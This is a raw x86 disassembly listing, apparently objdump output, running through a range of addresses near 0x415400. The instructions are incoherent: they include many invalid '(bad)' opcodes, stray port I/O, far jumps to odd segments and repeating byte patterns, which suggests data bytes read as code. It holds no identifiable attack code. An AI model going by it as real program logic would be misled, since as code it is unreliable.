  415369:	out    dx,al
  41536a:	out    dx,al
  41536b:	into   
  41536c:	into   
  41536d:	mov    al,ds:0x9d9d9da0
  415372:	xchg   edi,eax
  415373:	add    BYTE PTR [esi],al
  415375:	popf   
  415376:	add    BYTE PTR [edi],dl
  415378:	pushf  
  415379:	popf   
  41537a:	mov    eax,ds:0x88888890
  41537f:	cli    
  415380:	aad    0xf4
  415382:	aam    0xd5
  415384:	fcmovnbe st,st(5)
  415386:	fcmovnbe st,st(7)
  415388:	aad    0xc4
  41538a:	jmp    0x400:0xc4c6c6c6
  415391:	mov    BYTE PTR [eax],0x1a
  415394:	loopne 0x41535c
  415396:	mov    edi,0x92a7cde0
  41539b:	cld    
  41539c:	mov    cs,WORD PTR [esi-0x71717e72]
  4153a2:	xchg   DWORD PTR [edi-0x737e7179],eax
  4153a8:	lea    eax,[eax-0x6d6d738d]
  4153ae:	add    BYTE PTR [eax],al
  4153b0:	add    BYTE PTR [eax],cl
  4153b2:	mov    BYTE PTR [ecx+0x6e],dh
  4153b5:	jbe    0x415431
  4153b7:	pusha  
  4153b8:	jp     0x415377
  4153ba:	push   es
  4153bb:	jecxz  0x4153bd
  4153bd:	or     bh,cl
  4153bf:	stc    
  4153c0:	into   
  4153c1:	int3   
  4153c2:	out    dx,al
  4153c3:	int3   
  4153c4:	into   
  4153c5:	loope  0x415395
  4153c7:	sahf   
  4153c8:	add    eax,0x9719009d
  4153cd:	popf   
  4153ce:	popf   
  4153cf:	popf   
  4153d0:	mov    al,ds:0x9c9d9d9d
  4153d5:	popf   
  4153d6:	xchg   ebx,eax
  4153d7:	lahf   
  4153d8:	mov    BYTE PTR [eax-0x48242a38],dl
  4153de:	fcmovnbe st,st(4)
  4153e0:	fcmovnbe st,st(5)
  4153e2:	mov    esp,0xc60600bf
  4153e8:	add    BYTE PTR [esi+edx*8],cl
  4153eb:	mov    esi,0xbfc9bfbf
  4153f0:	mov    bl,0xfd
  4153f2:	mov    cs,WORD PTR [esi-0x71fb7e72]
  4153f8:	add    BYTE PTR [edi+eax*4],cl
  4153fb:	inc    ecx
  4153fc:	mov    esi,?
  4153fe:	mov    cs,WORD PTR [ecx+ecx*4-0x2768b73]
  415405:	mov    es,WORD PTR [eax]
  415407:	add    BYTE PTR [eax],al
  415409:	or     DWORD PTR [eax+0x7183846c],ebp
  41540f:	sbb    DWORD PTR [edi-0x7a],0x12
  415413:	add    BYTE PTR ds:0x4f901e3,al
  415419:	out    dx,al
  41541a:	add    BYTE PTR [esi],cl
  41541c:	stc    
  41541d:	out    dx,al
  41541e:	out    dx,al
  41541f:	loope  0x4153cb
  415421:	popf   
  415422:	pushf  
  415423:	popf   
  415424:	mov    al,ds:0x979d9c9d
  415429:	pushf  
  41542a:	add    eax,0x9c13009d
  41542f:	pushf  
  415430:	popf   
  415431:	mov    eax,ds:0xdbdbda90
  415436:	fcmovnbe st,st(5)
  415438:	fcmovnbe st,st(5)
  41543a:	aad    0xc4
  41543c:	(bad)  
  41543d:	mov    edi,0xcbbfaf
  415442:	add    eax,0xcb1a00c6
  415447:	mov    edi,0x81b1afcb
  41544c:	call   0x8e8e:0x928e8cfe
  415453:	xchg   DWORD PTR [esi-0x78787374],ecx
  415459:	xchg   DWORD PTR [esi-0x27f7f77],ecx
  41545f:	xchg   edx,eax
  415460:	add    BYTE PTR [eax],al
  415462:	add    BYTE PTR [edx],ah
  415464:	cmp    BYTE PTR [ebp+0x71716060],bh
  41546a:	test   BYTE PTR [ecx+ebx*4-0x1c311c1d],al
  415471:	into   
  415472:	out    dx,al
  415473:	int3   
  415474:	out    dx,al
  415475:	into   
  415476:	out    dx,al
  415477:	into   
  415478:	psubw  mm1,mm6
  41547b:	stc    
  41547c:	sahf   
  41547d:	popf   
  41547e:	mov    al,ds:0x9c9d9d9d
  415483:	popf   
  415484:	popf   
  415485:	pushf  
  415486:	add    al,0x9d
  415488:	add    BYTE PTR [edx],dh
  41548a:	pushf  
  41548b:	popf   
  41548c:	pushf  
  41548d:	pushf  
  41548e:	popf   
  41548f:	mov    ch,0xac
  415491:	hlt    
  415492:	(bad)  [edi-0x3b153b2b]
  415498:	mov    edi,0xbfb8bfb8
  41549d:	mov    edi,0xbfbfc6c6
  4154a2:	(bad)  
  4154a3:	scas   eax,DWORD PTR es:[edi]
  4154a4:	mov    edi,0x398e9acd
  4154a9:	mov    cs,WORD PTR [esi-0x1710204]
  4154af:	mov    es,WORD PTR [edi-0x7878be79]
  4154b5:	mov    es,WORD PTR [ecx-0x718c8074]
  4154bb:	xchg   edx,eax
  4154bc:	add    BYTE PTR [eax],al
  4154be:	add    BYTE PTR [esi],cl
  4154c0:	jnp    0x41553d
  4154c2:	mov    ebp,0x717885bc
  4154c7:	mov    bh,BYTE PTR [ebp-0x6061c1e]
  4154cd:	stc    
  4154ce:	pop    es
  4154cf:	out    dx,al
  4154d0:	add    BYTE PTR [esi],cl
  4154d2:	stc    
  4154d3:	out    dx,al
  4154d4:	stc    
  4154d5:	stos   BYTE PTR es:[edi],al
  4154d6:	popf   
  4154d7:	popf   
  4154d8:	pushf  
  4154d9:	mov    al,ds:0xa09d9da0
  4154de:	popf   
  4154df:	pushf  
  4154e0:	or     DWORD PTR [ebp-0x5a5fd400],ebx
  4154e6:	lods   al,BYTE PTR ds:[esi]
  4154e7:	aam    0xf4
  4154e9:	mov    esi,0xbfbfc6be
  4154ee:	mov    eax,0xbfbfafc9
  4154f3:	leave  
  4154f4:	mov    edi,0xc9cbbfc9
  4154f9:	mov    cl,0xfd
  4154fb:	std    
  4154fc:	call   0x8e8e:0x8e92fe8e
  415503:	or     DWORD PTR [esi-0x78717174],0x7e9a8787
  41550d:	jg     0x415498
  41550f:	xchg   edx,eax
  415510:	add    BYTE PTR [eax],al
  415512:	add    BYTE PTR [edx],bl
  415514:	adc    bh,bl
  415516:	test   al,0xc2
  415518:	add    DWORD PTR [ebx+0x10bd7977],0xffffffce
  41551f:	stc    
  415520:	stc    
  415521:	int3   
  415522:	out    dx,al
  415523:	int3   
  415524:	out    dx,al
  415525:	out    dx,al
  415526:	stc    
  415527:	out    dx,al
  415528:	out    dx,al
  415529:	loope  0x415519
  41552b:	stc    
  41552c:	pop    es
  41552d:	stos   BYTE PTR es:[edi],al
  41552e:	add    al,0x9d
  415530:	add    BYTE PTR [eax+eiz*4],al
  415533:	mov    al,ds:0x9d04a09c
  415538:	add    BYTE PTR [ebx],dl
  41553a:	xchg   edi,eax
  41553b:	pushf  
  41553c:	popf   
  41553d:	popf   
  41553e:	mov    al,ds:0xa09d9d9c
  415543:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415544:	mov    al,0xbe
  415546:	(bad)  
  415547:	mov    edi,0xafafc9c9
  41554c:	mov    ecx,0xc90500
  415551:	sbb    bh,BYTE PTR [ecx-0x26d4c50]
  415557:	or     DWORD PTR [esi-0x6d717179],0x87878e81
  415561:	xchg   DWORD PTR [esi-0x78717179],ecx
  415567:	xchg   DWORD PTR [ebp+ecx*4+0xfd89],ecx
  41556e:	add    BYTE PTR [edx],dl
  415570:	or     cl,al
  415572:	into   
  415573:	xchg   ecx,eax
  415574:	jl     0x4155e5
  415576:	js     0x4155f1
  415578:	mov    esp,ebx
  41557a:	stc    
  41557b:	stc    
  41557c:	out    dx,al
  41557d:	stc    
  41557e:	out    dx,al
  41557f:	out    dx,al
  415580:	int3   
  415581:	pop    es
  415582:	add    eax,0xcc0900ee
  415587:	pop    es
  415588:	int3   
  415589:	mov    ds:0xa09da09d,eax
  41558e:	mov    al,ds:0x9d0600
  415593:	xor    bl,BYTE PTR [ebp+ebx*4-0x5f626264]
  41559a:	popf   
  41559b:	pushf  
  41559c:	mov    al,ds:0xafa5a0a0
  4155a1:	(bad)  
  4155a2:	mov    edi,0xc9b9b8af
  4155a7:	scas   eax,DWORD PTR es:[edi]
  4155a8:	leave  
  4155a9:	leave  
  4155aa:	mov    ecx,0xa7cdc9af
  4155af:	std    
  4155b0:	mov    cs,WORD PTR [esi-0x71017872]
  4155b6:	dec    BYTE PTR [esi-0x65787172]
  4155bc:	mov    cs,WORD PTR [esi-0x78717102]
  4155c2:	call   0x0:0x928941
  4155c9:	invd   
  4155cb:	int3   
  4155cc:	shl    DWORD PTR [esp+ecx*1-0x74757a88],0xe4
  4155d4:	jecxz  0x4155a4
  4155d6:	out    dx,al
  4155d7:	stc    
  4155d8:	into   
  4155d9:	add    BYTE PTR [esi],al
  4155db:	out    dx,al
  4155dc:	add    BYTE PTR [ebx-0x1f],al
  4155df:	out    dx,al
  4155e0:	stc    
  4155e1:	out    dx,al
  4155e2:	pop    es
  4155e3:	stos   BYTE PTR es:[edi],al
  4155e4:	popf   
  4155e5:	popf   
  4155e6:	mov    al,ds:0x9ca09c9c
  4155eb:	popf   
  4155ec:	pushf  
  4155ed:	popf   
  4155ee:	mov    al,ds:0xa09da09d
  4155f3:	pushf  
  4155f4:	pushf  
  4155f5:	mov    al,ds:0xa0a29da0
  4155fa:	popf   
  4155fb:	mov    al,ds:0xb9afa2a0
  415600:	scas   eax,DWORD PTR es:[edi]
  415601:	scas   eax,DWORD PTR es:[edi]
  415602:	leave  
  415603:	scas   eax,DWORD PTR es:[edi]
  415604:	scas   eax,DWORD PTR es:[edi]
  415605:	leave  
  415606:	mov    al,0xb2
  415608:	scas   al,BYTE PTR es:[edi]
  415609:	add    ebp,edi
  41560b:	xchg   edx,eax
  41560c:	xchg   edx,eax
  41560d:	mov    cs,WORD PTR [esi-0x71787879]
  415613:	dec    BYTE PTR [esi-0x65717866]
  415619:	xchg   edx,eax
  41561a:	mov    ?,esi
  41561c:	mov    cs,WORD PTR [edi+eax*4+0x8e89]
  415623:	add    BYTE PTR [eax],al
  415625:	adc    esp,ecx
  415627:	in     eax,dx
  415628:	mov    dh,0x86
  41562a:	or     al,0x14
  41562c:	xchg   BYTE PTR [ebx-0x606427d],al
  415632:	loope  0x415622
  415634:	out    dx,al
  415635:	int3   
  415636:	int3   
  415637:	add    BYTE PTR [esi+ebp*8],al
  41563a:	add    BYTE PTR ds:0xcceeeecc,cl
  415640:	out    dx,al
  415641:	pop    es
  415642:	lods   al,BYTE PTR ds:[esi]
  415643:	popf   
  415644:	mov    al,ds:0xa09ca0a0
  415649:	add    BYTE PTR [ebx*4+0x1700a004],al
  415650:	popf   
  415651:	mov    al,ds:0x9da09da0
  415656:	mov    al,ds:0x979c9da0
  41565b:	xchg   edi,eax
  41565c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41565d:	lods   eax,DWORD PTR ds:[esi]
  41565e:	mov    edi,0xb8c9c9af
  415663:	mov    dl,0xa9
  415665:	std    
  415666:	xchg   edx,eax
  415667:	add    BYTE PTR [esi+ecx*4],al
  41566a:	add    BYTE PTR [esi],al
  41566c:	xchg   DWORD PTR [esi-0x1717379],ecx
  415672:	push   es
  415673:	mov    es,WORD PTR [eax]
  415675:	pop    es
  415676:	xchg   edx,eax
  415677:	std    
  415678:	mov    cs,WORD PTR [esi+0x898c87]
  41567e:	add    BYTE PTR [eax],al
  415680:	add    BYTE PTR ds:0x13bc08aa,cl
  415686:	iret   
  415687:	push   ebx
  415688:	jl     0x41560d
  41568a:	or     DWORD PTR [edx+0xff9e4],0x4
  415691:	out    dx,al
  415692:	add    BYTE PTR [ebx],al
  415694:	int3   
  415695:	out    dx,al
  415696:	int3   
  415697:	add    BYTE PTR ds:0xe10300ee,al
  41569d:	stc    
  41569e:	stos   BYTE PTR es:[edi],al
  41569f:	add    BYTE PTR ds:0x9c0e00a0,al
  4156a5:	mov    al,ds:0x9d9da09d
  4156aa:	mov    al,ds:0x9da09ca0
  4156af:	mov    al,ds:0x9d04a09d
  4156b4:	add    BYTE PTR ds:0x9797979c,ah
  4156ba:	mov    eax,ds:0xb2b8b9a3
  4156bf:	mov    dh,0xfd
  4156c1:	std    
  4156c2:	xchg   edx,eax
  4156c3:	std    
  4156c4:	std    
  4156c5:	mov    cs,WORD PTR [esi-0x78730172]
  4156cb:	xchg   DWORD PTR [esi+ecx*4-0x7171716e],ecx
  4156d2:	std    
  4156d3:	mov    cs,WORD PTR [esi-0x716d7103]
  4156d9:	mov    cs,WORD PTR [ecx+0x0]
  4156df:	adc    al,al
  4156e1:	stos   BYTE PTR es:[edi],al
  4156e2:	cli    
  4156e3:	adc    BYTE PTR [ebx+edx*2],cl
  4156e6:	jno    0x415673
  4156e8:	mov    eax,DWORD PTR [ebx-0x11061d6f]
  4156ee:	out    dx,al
  4156ef:	int3   
  4156f0:	pop    es
  4156f1:	out    dx,al
  4156f2:	add    BYTE PTR [eax],dl
  4156f4:	loope  0x4156e4
  4156f6:	out    dx,al
  4156f7:	stc    
  4156f8:	out    dx,al
  4156f9:	mov    ds:0xa0a0a1a0,eax
  4156fe:	popf   
  4156ff:	mov    al,ds:0x9da09da0
  415704:	push   es
  415705:	mov    al,ds:0x9d9c0500
  41570a:	pushf  
  41570b:	popf   
  41570c:	popf   
  41570d:	add    BYTE PTR [edi],al
  41570f:	xchg   edi,eax
  415710:	add    BYTE PTR [eax],dl
  415712:	mov    bl,0xae
  415714:	mov    ?,ebp
  415716:	xchg   edx,eax
  415717:	xchg   edx,eax
  415718:	mov    ss,WORD PTR [edx-0x71657172]
  41571e:	xchg   esi,edi
  415720:	mov    WORD PTR [edi+0xa008e05],es
  415726:	xchg   edx,eax
  415727:	mov    cs,WORD PTR [esi-0x716d716e]
  41572d:	xchg   edx,eax
  41572e:	or     DWORD PTR [esi+0xd000000],0x10ededc0
  415738:	push   ebx
  415739:	push   ebx
  41573a:	jno    0x4156bf
  41573c:	or     DWORD PTR [ebx+0x7ef83],0x5
  415743:	out    dx,al
  415744:	add    esp,ecx
  415746:	add    eax,0xce0600ee
  41574b:	stc    
  41574c:	stc    
  41574d:	out    dx,al
  41574e:	retf   0x5a5
  415751:	mov    al,ds:0xa00b9d01
  415756:	add    BYTE PTR [ebx],al
  415758:	popf   
  415759:	xchg   edi,eax
  41575a:	pushf  
  41575b:	add    BYTE PTR [edi+edx*4],al
  41575e:	add    BYTE PTR [ebx+ebx*4],cl
  415761:	xchg   edi,eax
  415762:	xchg   edi,eax
  415763:	xchg   edi,eax
  415764:	xchg   esp,eax
  415765:	test   eax,0x929292fd
  41576a:	call   0x920c:0x8e0afd
  415771:	mov    cs,WORD PTR [esi-0x71026d6e]
  415777:	mov    ?,ebp
  415779:	cld    
  41577a:	std    
  41577b:	add    DWORD PTR [eax],0xc00e0000
  415781:	or     ah,cl
  415783:	adc    BYTE PTR [ebx],ch
  415785:	push   ebx
  415786:	jb     0x415713
  415788:	mov    eax,DWORD PTR [ebx-0x6f04276]
  41578e:	or     dh,ch
  415790:	add    ecx,edi
  415792:	add    al,0xee
  415794:	add    BYTE PTR ds:0xbed5caf9,al
  41579a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41579b:	add    BYTE PTR [eax],cl
  41579d:	mov    al,ds:0xa0a20900
  4157a2:	mov    al,ds:0x9da0a09c
  4157a7:	popf   
  4157a8:	pushf  
  4157a9:	add    BYTE PTR ds:0x950e0097,al
  4157af:	fwait
  4157b0:	xchg   edi,eax
  4157b1:	fwait
  4157b2:	xchg   edi,eax
  4157b3:	xchg   esp,eax
  4157b4:	std    
  4157b5:	mov    ss,WORD PTR [edx-0x6d6d0203]
  4157bb:	mov    es,WORD PTR [edx+edx*4]
  4157be:	add    BYTE PTR [eax],dl
  4157c0:	mov    ss,WORD PTR [edx-0x2717172]
  4157c6:	mov    ?,ebp
  4157c8:	xchg   edx,eax
  4157c9:	xchg   edx,eax
  4157ca:	xchg   edx,eax
  4157cb:	std    
  4157cc:	cmp    ebp,0x101
  4157d2:	add    BYTE PTR [ecx-0x27],al
  4157d5:	in     eax,dx
  4157d6:	int3   
  4157d7:	adc    BYTE PTR [ebx+0x14],dl
  4157da:	jns    0x415767
  4157dc:	mov    eax,DWORD PTR [ebx+0x7ef8383]
  4157e2:	stc    
  4157e3:	stc    
  4157e4:	out    dx,al
  4157e5:	pop    es
  4157e6:	out    dx,al
  4157e7:	stc    
  4157e8:	out    dx,al
  4157e9:	pop    es
  4157ea:	out    dx,al
  4157eb:	out    dx,al
  4157ec:	out    dx,al
  4157ed:	pop    es
  4157ee:	out    dx,al
  4157ef:	fmul   st,st(2)
  4157f1:	jmp    0x4157e7
  4157f3:	hlt    
  4157f4:	lods   al,BYTE PTR ds:[esi]
  4157f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157f6:	mov    al,ds:0xa2a2a0a2
  4157fb:	mov    al,ds:0x9d9da0a0
  415800:	mov    al,ds:0x979da0a0
  415805:	popf   
  415806:	xchg   edi,eax
  415807:	xchg   edi,eax
  415808:	xchg   edi,eax
  415809:	fwait
  41580a:	xchg   ebp,eax
  41580b:	xchg   ebp,eax
  41580c:	xchg   edi,eax
  41580d:	xchg   edi,eax
  41580e:	xchg   edi,eax
  41580f:	scas   al,BYTE PTR es:[edi]
  415810:	add    ebp,edi
  415812:	mov    ?,ebp
  415814:	mov    es,WORD PTR [eax]
  415816:	add    al,0xfd
  415818:	add    DWORD PTR [edx-0x2fa6dff],edx
  41581e:	add    DWORD PTR [ecx],eax
  415820:	add    ebp,edi
  415822:	add    al,0x1
  415824:	add    BYTE PTR [esi],al
  415826:	std    
  415827:	std    
  415828:	call   0x0:0xbbab89
  41582f:	push   es
  415830:	shr    BYTE PTR [edx+0x7814e30f],0x5
  415837:	mov    eax,DWORD PTR [eax]
  415839:	or     BYTE PTR [ebx-0x11f80667],al
  41583f:	out    dx,al
  415840:	out    dx,al
  415841:	loope  0x415848
  415843:	out    dx,al
  415844:	add    BYTE PTR [ebx],dl
  415846:	stc    
  415847:	out    dx,al
  415848:	out    dx,al
  415849:	fmul   st,st(2)
  41584b:	(bad)  
  41584c:	hlt    
  41584d:	or     DWORD PTR [ecx],ecx
  41584f:	ret    
  415850:	lods   al,BYTE PTR ds:[esi]
  415851:	mov    eax,ds:0xa09d9da0
  415856:	popf   
  415857:	mov    al,ds:0x9d0500a0
  41585c:	add    BYTE PTR [esi],al
  41585e:	pushf  
  41585f:	xchg   edi,eax
  415860:	xchg   edi,eax
  415861:	fwait
  415862:	xchg   ebp,eax
  415863:	xchg   ebp,eax
  415864:	add    eax,0xae1d0097
  415869:	(bad)  
  41586a:	xchg   edx,eax
  41586b:	xchg   edx,eax
  41586c:	call   0x8ca9:0xa9a9fc9a
  415873:	test   eax,0x89a78989
  415878:	mov    DWORD PTR [ebx-0x494b4b55],ebp
  41587e:	mov    ebx,0xadad1d0
  415883:	jmp    0x41596d
  415888:	add    BYTE PTR [esi],cl
  41588a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41588b:	ror    DWORD PTR [eax],1
  41588d:	xchg   ecx,eax
  41588e:	jns    0x415813
  415890:	mov    edi,DWORD PTR [ebp-0x747c7c75]
  415896:	mov    esp,ebx
  415898:	push   es
  415899:	out    dx,al
  41589a:	add    BYTE PTR [esi],dl
  41589c:	stc    
  41589d:	out    dx,al
  41589e:	out    dx,al
  41589f:	out    dx,al
  4158a0:	into   
  4158a1:	loope  0x415891
  4158a3:	in     eax,dx
  4158a4:	enter  0xeaf6,0x9
  4158a8:	hlt    
  4158a9:	or     edi,esp
  4158ab:	mov    esi,0x9d9d9da5
  4158b0:	mov    al,ds:0x9d049c
  4158b5:	sub    dl,BYTE PTR [edi-0x64686863]
  4158bb:	xchg   ebp,eax
  4158bc:	xchg   ebp,eax
  4158bd:	fwait
  4158be:	xchg   ebp,eax
  4158bf:	xchg   edi,eax
  4158c0:	fwait
  4158c1:	xchg   ebp,eax
  4158c2:	popf   
  4158c3:	fcmovu st,st(2)
  4158c5:	(bad)  
  4158c7:	(bad)  
  4158c9:	(bad)  
  4158cb:	fincstp 
  4158cd:	int3   
  4158ce:	or     BYTE PTR [eax],cl
  4158d0:	into   
  4158d1:	jecxz  0x41586c
  4158d3:	into   
  4158d4:	into   
  4158d5:	out    dx,al
  4158d6:	fcomp  st(7)
  4158d8:	out    0xe6,al
  4158da:	rcl    ebx,cl
  4158dc:	in     eax,0xd3
  4158de:	(bad)
  4158e1:	add    BYTE PTR [eax],al
  4158e3:	adc    DWORD PTR [ebp-0x798b7274],ecx
  4158e9:	mov    edi,DWORD PTR [ecx-0x75]
  4158ec:	mov    eax,DWORD PTR [ebx-0x10427475]
  4158f2:	stc    
  4158f3:	pop    es
  4158f4:	int3   
  4158f5:	add    BYTE PTR [edi],al
  4158f7:	out    dx,al
  4158f8:	add    BYTE PTR [edx],dl
  4158fa:	stc    
  4158fb:	out    dx,al
  4158fc:	fsubr  st,st(5)
  4158fe:	enter  0xeae0,0xf4
  415902:	or     ebp,edx
  415904:	hlt    
  415905:	or     DWORD PTR [ecx],ecx
  415907:	lods   al,BYTE PTR ds:[esi]
  415908:	mov    ds:0x6a09d9d,al
  41590d:	popf   
  41590e:	add    BYTE PTR [eax],ch
  415910:	xchg   edi,eax
  415911:	xchg   edi,eax
  415912:	xchg   edi,eax
  415913:	fwait
  415914:	fwait
  415915:	xchg   ebp,eax
  415916:	fwait
  415917:	xchg   edi,eax
  415918:	xchg   edi,eax
  415919:	xchg   ebp,eax
  41591a:	popf   
  41591b:	shl    edx,cl
  41591d:	rcl    ebx,cl
  41591f:	in     eax,0xe9
  415921:	rcl    ebx,cl
  415923:	rcr    esp,cl
  415925:	in     al,dx
  415926:	fsubr  st(1),st
  415928:	fld    QWORD PTR [ebx*8-0x1e070708]
  41592f:	fdivr  st(5),st
  415931:	out    0xe6,al
  415933:	in     eax,0xc5
  415935:	shl    ebp,cl
  415937:	in     eax,0x0
  415939:	add    BYTE PTR [eax],al
  41593b:	adc    DWORD PTR [ecx],eax
  41593d:	cmp    ebp,0x798b857f
  415943:	jns    0x4158d0
  415945:	or     DWORD PTR [ebx-0x1c42747d],0xffffffce
  41594c:	stc    
  41594d:	add    BYTE PTR ds:0x71500ee,al
  415953:	out    dx,al
  415954:	out    dx,al
  415955:	out    dx,al
  415956:	push   cs
  415957:	jmp    0xa083a47
  41595c:	out    0x9,eax
  41595e:	hlt    
  41595f:	out    0xe7,eax
  415961:	repz les ebp,FWORD PTR [edi+0x9c9da2]
  415968:	add    al,0x9d
  41596a:	add    BYTE PTR [edi],cl
  41596c:	xchg   edi,eax
  41596d:	xchg   edi,eax
  41596e:	xchg   edi,eax
  41596f:	xchg   ebp,eax
  415970:	xchg   ebp,eax
  415971:	xchg   ebp,eax
  415972:	xchg   edi,eax
  415973:	xchg   ebp,eax
  415974:	fwait
  415975:	xchg   ebp,eax
  415976:	xchg   ebp,eax
  415977:	mov    al,ds:0xd2d3d3
  41597c:	add    al,0xd3
  41597e:	add    BYTE PTR [esi],dl
  415980:	frstpm(287 only) 
  415982:	loope  0x415979
  415984:	cmc    
  415985:	(bad)  
  415987:	fucom  st(1)
  415989:	fstp   st(5)
  41598b:	add    al,0xdd
  41598d:	(bad)  
  41598f:	cmc    
  415990:	cmc    
  415991:	(bad)  
  415993:	retf   0xd0da
  415996:	add    BYTE PTR [eax],al
  415998:	add    BYTE PTR [edi],al
  41599a:	xchg   edx,eax
  41599b:	std    
  41599c:	xchg   edx,eax
  41599d:	(bad)  
  41599e:	je     0x41592a
  4159a0:	mov    ebp,0x8b0400
  4159a5:	or     DWORD PTR [ecx-0x75],edi
  4159a8:	mov    ebp,edi
  4159aa:	loope  0x41599a
  4159ac:	stc    
  4159ad:	out    dx,al
  4159ae:	pop    es
  4159af:	add    BYTE PTR [esi],al
  4159b1:	out    dx,al
  4159b2:	add    BYTE PTR [ecx],dl
  4159b4:	ffreep st(7)
  4159b6:	mov    edi,0xf40303e0
  4159bb:	or     esp,esi
  4159bd:	hlt    
  4159be:	hlt    
  4159bf:	out    0x9,eax
  4159c1:	out    0xc4,eax
  4159c3:	mov    edi,0x9d0500a5
  4159c8:	add    BYTE PTR [eax],ch
  4159ca:	fwait
  4159cb:	fwait
  4159cc:	xchg   ebp,eax
  4159cd:	xchg   esp,eax
  4159ce:	xchg   ebp,eax
  4159cf:	fwait
  4159d0:	xchg   ebp,eax
  4159d1:	fwait
  4159d2:	xchg   ebp,eax
  4159d3:	xchg   ebp,eax
  4159d4:	lods   al,BYTE PTR ds:[esi]
  4159d5:	icebp  
  4159d6:	rcl    ebx,cl
  4159d8:	rcl    bl,cl
  4159da:	rcr    bl,cl
  4159dc:	rcr    ebx,cl
  4159de:	(bad)
  4159e1:	(bad)  
  4159e3:	(bad)  
  4159e5:	push   es
  4159e6:	rcl    cl,0xfa
  4159e9:	ret    0xbcbc
  4159ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4159ed:	test   al,0x74
  4159ef:	stos   DWORD PTR es:[edi],eax
  4159f0:	mov    DWORD PTR [ecx+0x9000000],eax
  4159f6:	xchg   edx,eax
  4159f7:	xchg   edx,eax
  4159f8:	xchg   edx,eax
  4159f9:	std    
  4159fa:	jg     0x415981
  4159fc:	jns    0x415989
  4159fe:	add    DWORD PTR [eax],0x5
  415a01:	mov    eax,DWORD PTR [eax]
  415a03:	add    eax,0xee07f999
  415a08:	pop    es
  415a09:	add    BYTE PTR ds:0xd80900ee,al
  415a0f:	(bad)  
  415a11:	(bad)  
  415a12:	loopne 0x4159ea
  415a14:	jmp    0xf4:0x800e709
  415a1b:	das    
  415a1c:	out    0xf4,eax
  415a1e:	scas   eax,DWORD PTR es:[edi]
  415a1f:	mov    ds:0x9797979d,al
  415a24:	fwait
  415a25:	xchg   ebp,eax
  415a26:	xchg   ebp,eax
  415a27:	xchg   ebp,eax
  415a28:	fwait
  415a29:	xchg   ebp,eax
  415a2a:	xchg   edi,eax
  415a2b:	xchg   edi,eax
  415a2c:	xchg   edi,eax
  415a2d:	xchg   ebx,eax
  415a2e:	mov    ebx,0xb1b6bcb6
  415a33:	mov    ah,0xb1
  415a35:	stos   DWORD PTR es:[edi],eax
  415a36:	mov    cl,0xae
  415a38:	stos   DWORD PTR es:[edi],eax
  415a39:	mov    cl,0xb1
  415a3b:	scas   al,BYTE PTR es:[edi]
  415a3c:	mov    cl,0xa7
  415a3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a3f:	call   0x7e41:0x8101fd8e
  415a46:	jg     0x415ac7
  415a48:	ins    DWORD PTR es:[edi],dx
  415a49:	mov    DWORD PTR [ebx+0x0],ebp
  415a4f:	or     dl,BYTE PTR [edx-0x78026d6e]
  415a55:	ins    BYTE PTR es:[edi],dx
  415a56:	or     DWORD PTR [ebx+0x79048b8b],0x0
  415a5d:	sub    eax,0xe1eee386
  415a62:	out    dx,al
  415a63:	fdivr  st,st(1)
  415a65:	out    dx,al
  415a66:	out    dx,al
  415a67:	out    dx,al
  415a68:	in     eax,dx
  415a69:	push   es
  415a6a:	(bad)  
  415a6b:	scas   eax,DWORD PTR es:[edi]
  415a6c:	loopne 0x415a58
  415a6e:	or     esp,esi
  415a70:	or     esp,esi
  415a72:	hlt    
  415a73:	hlt    
  415a74:	out    0xf4,eax
  415a76:	hlt    
  415a77:	or     edx,ebp
  415a79:	aam    0xe7
  415a7b:	or     edx,ebp
  415a7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a7e:	mov    eax,ds:0x959b959b
  415a83:	xchg   ebp,eax
  415a84:	xchg   ebp,eax
  415a85:	xchg   edi,eax
  415a86:	fwait
  415a87:	xchg   edi,eax
  415a88:	fwait
  415a89:	xchg   ebp,eax
  415a8a:	mov    es,WORD PTR [eax]
  415a8c:	add    al,0x81
  415a8e:	add    BYTE PTR [ecx],bl
  415a90:	std    
  415a91:	add    DWORD PTR [ecx-0x27e7e03],0x1fdfd81
  415a9b:	std    
  415a9c:	add    DWORD PTR [ecx-0x710202ff],0xa8748d89
  415aa6:	ret    0xf7c1
  415aa9:	add    BYTE PTR [eax],al
  415aab:	add    BYTE PTR [eax],al
  415aad:	pop    eax
  415aae:	std    
  415aaf:	mov    ?,ebp
  415ab1:	xchg   edx,eax
  415ab2:	std    
  415ab3:	je     0x415afa
  415ab5:	or     DWORD PTR [ebx-0x74867475],0xffffff83
  415abc:	mov    ebp,0x7eee1e4
  415ac1:	out    dx,al
  415ac2:	out    dx,al
  415ac3:	out    dx,al
  415ac4:	loope  0x415ab4
  415ac6:	faddp  st(7),st
  415ac8:	loopne 0x415aa0
  415aca:	hlt    
  415acb:	or     esp,esi
  415acd:	or     esp,esi
  415acf:	hlt    
  415ad0:	or     esp,esi
  415ad2:	or     esp,esi
  415ad4:	hlt    
  415ad5:	out    0xf4,eax
  415ad7:	hlt    
  415ad8:	hlt    
  415ad9:	out    0xe7,eax
  415adb:	hlt    
  415adc:	leave  
  415add:	mov    ch,0x94
  415adf:	xchg   ebp,eax
  415ae0:	xchg   ebp,eax
  415ae1:	xchg   ebp,eax
  415ae2:	fwait
  415ae3:	xchg   ebp,eax
  415ae4:	xchg   ebp,eax
  415ae5:	fwait
  415ae6:	xchg   edi,eax
  415ae7:	scas   al,BYTE PTR es:[edi]
  415ae8:	mov    cs,WORD PTR [esi-0x7e787879]
  415aee:	add    DWORD PTR [ecx-0x20202ff],0x81fdfd81
  415af8:	xchg   edx,eax
  415af9:	test   eax,0xbbb6b1a7
  415afe:	rcr    dl,1
  415b00:	fldl2t 
  415b02:	fdivrp st(5),st
  415b04:	(bad)  
  415b06:	add    BYTE PTR [eax],al
  415b08:	add    BYTE PTR [edx],dh
  415b0a:	xchg   edx,eax
  415b0b:	std    
  415b0c:	xchg   edx,eax
  415b0d:	std    
  415b0e:	mov    es,WORD PTR [eax+0x79838b85]
  415b14:	mov    edi,DWORD PTR [ecx+0x79]
  415b17:	mov    ecx,DWORD PTR [edx-0x11f83167]
